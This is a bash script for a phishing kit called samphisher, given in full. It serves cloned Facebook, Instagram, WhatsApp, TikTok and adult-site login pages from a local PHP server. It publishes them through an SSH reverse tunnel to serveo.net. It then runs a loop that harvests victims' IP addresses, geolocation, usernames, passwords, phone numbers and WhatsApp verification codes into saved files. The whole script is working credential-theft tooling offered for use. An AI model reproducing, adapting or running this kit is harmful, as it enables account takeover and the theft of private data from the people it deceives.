#!/bin/bash

 # MIT License
 # 
 # Copyright (c) 2024 sasame - whmerphisher

 #   ___  __ _ ___  __ _ _ __ ___   ___ 
 #  / __|/ _` / __|/ _` | '_ ` _ \ / _ \
 #  \__ \ (_| \__ \ (_| | | | | | |  __/
 #  |___/\__,_|___/\__,_|_| |_| |_|\___|
 #         _     _     _               
 #   _ __ | |__ (_)___| |__   ___ _ __ 
 #  | '_ \| '_ \| / __| '_ \ / _ \ '__|
 #  | |_) | | | | \__ \ | | |  __/ |   
 #  | .__/|_| |_|_|___/_| |_|\___|_|   
 #  |_| 

 # 
 # Github kym-sam   :   https://github.com/kym-sam/
 # Githun whmer     :   https://github.com/whmer
 # Version          :   0.2.3
 # Author           :   sasame - samphisher 
 #
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
 # 
 # The above copyright notice and this permission notice shall be included in all
 # copies or substantial portions of the Software.
 # 
 #
 #
 # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 


RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"  
RESETBG="$(printf '\e[0m\n')" ##LEAN="$(printf '\e[0m\e[1;77m\n')"


if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ ! -d ".history" ]]; then
	mkdir -p ".history"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
	
fi

if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"

fi

if [[ -d ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"    
fi

if [[ ! -d ".sever" ]]; then
	mkdir -p ".server"
fi

 printf "\e[1;92m"

 HOST="127.0.0.1"
 PORT="8080"

 USER="root𐪕sasame"

PLAY2="${WHITE}┌──($USER${WHITE})‒[${WHITE} ${RED}try Ctrl + C to close${WHITE} ] ...
└─${RED}>: ${WHITE}"

__VERSION__="0.2.3"

banner_py(){
cat << EOF
${WHITE}
${WHITE} ___  __ _  ___  __ _ _ __  __   ___
${WHITE}/ __|/ _' |/ __|/ _' | '_ ' _  \/ _ \ 
${WHITE}\__ \ (_| |\__ \ (_| | | | | | |  __/
${WHITE}|___/\__,_||___/\__,_|_| |_| |_|\___|
                       ${WHITE}Version: $__VERSION__                                       
EOF
}

banner(){
    clear
    banner_py
    echo -e "\n${WHITE}-- =[ Program Created by ~> sasame"

timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
if [[ $? -eq 0 ]]; then
echo -e "${WHITE}-- =[ Checking status => Program ${GREEN}on-line"
else
echo -e "${WHITE}-- =[ Checking status => Program ${RED}off-line"
fi

help
terminal
}

about(){
    echo "[-] Loading..."
    sleep 0.73
    clear;
cat banner.sh
cat << EOF

${WHITEBG}${BLACK} Account GITHUB  ${RESETBG}
${WHITE}Github - kym-sam  :  ${RED}https://github.com/kym-sam
${WHITE}Github - whmer    :  ${RED}https://github.com/whmer
EOF
printf "\e[1;92m"
terminal
}


help_phisher(){
cat << EOF
sam facebook.net         sam whatsapp.net 
sam tiktok.net           sam instagram.net   
sam hentai.net 
EOF
}

history(){
  if [[ ".history/sam_history.dat" ]]; then
  echo "${GREEN}"
  cat .history/sam_history.dat
  echo -e "\n${WHITE}"
  else 
  echo -e "${RED}Erro!${WHITE} No such file or directory"
  fi
}

terminal(){
echo ""
read -p "$PLAY2" mik
  echo ""
  if [ "$mik" == "help" ]; then
   printf "\n$mik" >> .history/sam_history.dat
  help
   elif [ "$mik" == "clear" ]; then
  clear
   printf "\n$mik" >> .history/sam_history.dat
  terminal
    
  elif [ "$mik" == "sam banner" ]; then
  help_banner
  terminal

     elif [ "$mik" == "samphisher" ]; then
     help_phisher
  terminal

  elif [ "$mik" == "sam ip" ]; then
  node index.js
   terminal

   elif [ "$mik" == "history" ]; then
   printf "\n$mik" >> .history/sam_history.dat
   history 
  terminal 

      elif [ "$mik" == "sam instagram.net" ]; then
     website='instagram'
      setup_site
      start_serveo 
      
      elif [ "$mik" == "sam facebook.net" ]; then
   printf "\n$mik" >> .history/sam_history.dat
   website='facebook'
   setup_site
   start_serveo

    elif [ "$mik" == "sam hentai.net" ]; then
   printf "\n$mik" >> .history/sam_history.dat
   website='SaraBell'
   setup_site
   start_serveo
   
    elif [ "$mik" == "sam whatsapp.net" ]; then
   printf "\n$mik" >> .history/sam_history.dat
   website='whatsapp' 
   setup_site
   start_serveo
   
      elif [ "$mik" == "sam tiktok.net" ]; then
      printf "\n$mik" >> .history/sam_history.dat
   website='tiktok'
   setup_site
   start_serveo
      
  elif [ "$mik" == "about" ]; then
  sleep 0.75
  about
   printf "\n$mik" >> .history/sam_history.dat
  terminal

  elif [ "$mik" == "ls" ]; then
  command ls
   printf "\n$mik" >> .history/sam_history.dat
  terminal 

  elif [ "$mik" == "pwd" ]; then
  command pwd
   printf "\n$mik" >> .history/sam_history.dat
  terminal 
  elif [ "$mik" == "exit" ]; then
  sleep 0.75
   printf "\n$mik" >> .history/sam_history.dat
  exit

else 
echo "-${RED} ERRO! Try Again..."
{ sleep 4; clear; banner; }
fi
}


setup_site() {
	cp -rf .sam/"$website"/* .server/www
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}


start_serveo() {
sleep 0.75;
printf "\n${WHITE}[-] ${WHITEBG} ${BLACK}http://$HOST:$PORT ${RESETBG} ${WHITE} Initializing..."
cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
echo ''
if [[ -e .server/www/linksender ]]; then
rm -rf .server/www/linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > .server/www/linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .server/www/linksender)
printf "\n"
echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
printf "\n"
capture_data
}


help(){
cat << EOF
${WHITE}
WELCOME!
Bash sam.sh${WHITE} Version: $__VERSION__ - 2024
Github : ${RED}https://github.com/kym-sam${WHITE}
Github : ${RED}https://github.com/whmer${WHITE}

COMMANDS:

samphisher          sam ip
sam banner          history
exit                about

EOF
terminal
}

help_banner(){
cat << EOF
${WHITE}
FONTS :${GREEN}
console, block, simpleBlock, simple, 3d, simple3d 
chrome, huge, shade, slick, grid, pallet, tiny
${WHITE}
EOF
  read -p "${WHITE}[-] Type your name : " name
  read -p "${WHITE}[-] Select the source   : " font
  clear
  cfonts "$name" -f "$font" -a center -c white,green
}
ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
	echo -e "${WHITE}[-] IP : $IP\n"
    cat .server/www/ip.txt >> auth/ip.dat
}


cod(){
 cod=$(grep -o 'Cod:.*' .server/www/cod.txt | awk -F ":." '{print  $NF}')
 IFS=$'\n'
 echo -e "${WHITE}[-] Cod : $cod\n"
}

location() {
	LOC=$(grep -a 'Latitude:' .server/www/location.txt | cut -d " " -f2 | tr -d '\r')
    LOC2=$(grep -a 'Longitude:' .server/www/location.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
		echo -e "\n${WHITE}Latitude  : ${BLUE}$LOC"
    echo -e "\n${WHITE}Longitude  : ${BLUE}$LOC2"
    cat .server/www/location.txt >> auth/location.dat
}

meta(){
user=$(grep -o 'Username:.*' .server/www/usernames.txt | awk -F ":." '{print  $NF}')
pass=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print  $NF}')
IFS=$'\n'
	echo -e "\n${WHITE}Username  :   ${BLUE}$user"
	echo -e "\n${WHITE}Password  :   ${BLUE}$pass"
    cat .server/www/usernames.txt >> auth/usernames.dat
}

meta_number(){
Name=$(grep -o 'Username:.*' .server/www/data.txt | awk -F ":." '{print  $NF}')
Number=$(grep -o 'Number:.*' .server/www/data.txt | awk -F ":." '{print  $NF}')
IFS=$'\n'
	echo -e "\n${WHITE}Username  :   ${BLUE}$Name"
	echo -e "\n${WHITE}Number    :   ${BLUE}$Number"
    cat .server/www/data.txt >> auth/data.dat
}

capture_data() {
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New IP !${WHITE} ~"
			ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
    		if [[ -e ".server/www/location.txt" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] Location.php !${WHITE} ~"
			location
			rm -rf .server/www/location.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New Login !${WHITE} ~"
			meta
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
				if [[ -e ".server/www/cod.txt" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] WhatsApp Cod !${WHITE} ~"
			cod
			rm -rf .server/www/cod.txt		
		fi
        	if [[ -e ".server/www/data.txt" ]]; then
			echo -e "\n${GREEN}[${WHITE}!${GREEN}] WhatsApp Number Login !${WHITE} ~"
            echo -e "\n${WHITE} [-] Init cod"
			meta_number
			rm -rf .server/www/data.txt
        fi
		sleep 0.75
	done
}

banner